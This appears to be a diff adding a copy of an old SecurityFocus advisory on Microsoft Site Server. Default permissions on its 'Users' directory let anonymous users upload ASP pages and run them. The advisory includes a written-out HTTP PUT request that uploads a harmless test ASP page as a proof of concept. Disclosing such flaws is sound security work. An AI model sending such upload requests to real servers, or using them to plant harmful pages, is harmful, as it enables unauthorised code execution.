@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/1811/info
+
+Microsoft Site Server is an intranet server designed for an NT Server with IIS. Site Server enables users to locate and view information stored in various locations through personalized web pages and emails.
+
+The 'Users' directory, if not already created, is automatically generated once the first successful upload has been completed. By default the 'Everyone' group is given NTFS Change privileges in the 'Users' directory. As well, Scripting and Write permissions are assigned by IIS. Due to all of these factors, it is possible for a user to create and upload various content including ASP pages to the web server through the Anonymous Internet Account (IUSR_machinename).
+
+If one does not have knowledge of a password to access the services in Site Server, a user could telnet to port 80 on the web server and perform a specially crafted PUT request. Once the file is created performing a specially formed GET request will execute the file.
+
+Successful exploitation of this vulnerability will allow a remote user to possibly upload malicious content to the web site.
+
+PUT /users/non-aggressive-script.asp HTTP/1.0
+Content-length: 120
+Entity-body:
+<HTML>
+<BODY>
+Request method is <% Response.Write
+Request.ServerVariables("REQUEST_METHOD")%>.<BR>
+</BODY>
+</HTML>
+\n
+\n
+\n
